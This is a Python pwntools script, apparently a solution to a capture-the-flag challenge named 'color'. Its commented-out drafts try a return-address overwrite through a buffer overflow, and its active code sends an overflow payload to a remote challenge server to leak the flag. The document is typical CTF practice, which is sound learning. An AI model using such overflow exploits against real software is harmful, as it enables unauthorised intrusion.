# from pwn import *

# # Connect to the process or remote server
# binary = './color'
# elf = context.binary = ELF(binary)

# for i in range(100):
# 	print(f'index: {i}')
# 	p = process(binary)

# 	# Create a payload with the necessary padding to reach RIP
# 	# Fill the buffer with 'A's until we reach the return address
# 	offset = 32 + i  # For example, determined using GDB
# 	padding = b"A" * offset

# 	# Overwrite the return address with the address of main or a function that prints FLAG
# 	# For example, assuming main is at address 0x401080 (use `gdb` to find the correct address)
# 	# return_to_main = p64(elf.symbols['main'])
# 	return_to_main = p64(0x000000000000127a)

# 	# Build the final payload
# 	payload = padding + return_to_main

# 	# Send the payload to the program
# 	p.sendlineafter("What's your favorite color? ", payload)

# 	# Interact with the program to see the flag
# 	p.interactive()

# 	p.close()

# from pwn import *

# # Connect to the process or remote server
# binary = './color'
# elf = context.binary = ELF(binary)

# p = process(binary)

# # Create a payload with the necessary padding to reach RIP
# # Fill the buffer with 'A's until we reach the return address
# payload = b"A" * 32 + b'b'*4 + b'c'*4 + b'd'*4 + b'e'*4 + b'f'*4

# # Send the payload to the program
# p.sendlineafter("What's your favorite color? ", payload)

# # Interact with the program to see the flag
# p.interactive()

# p.close()


from pwn import *

# Start the process
# p = process('./color')  # Replace with your binary
p  = remote('challs.pwnoh.io', 13370)

# Prepare the payload
# Buffer size is 32 (0x20) for FAVORITE_COLOR, overflow happens after 32 bytes
payload = b"A" * 32  # Fill FAVORITE_COLOR completely

# Send the payload to the program
p.sendline(payload)

# Receive the response
p.recvuntil("What's your favorite color? ")

# Since the program will print the contents of FAVORITE_COLOR, this should leak FLAG
response = p.recv()

# Print the leaked flag
print(response)

# Keep the process open for interaction
p.interactive()
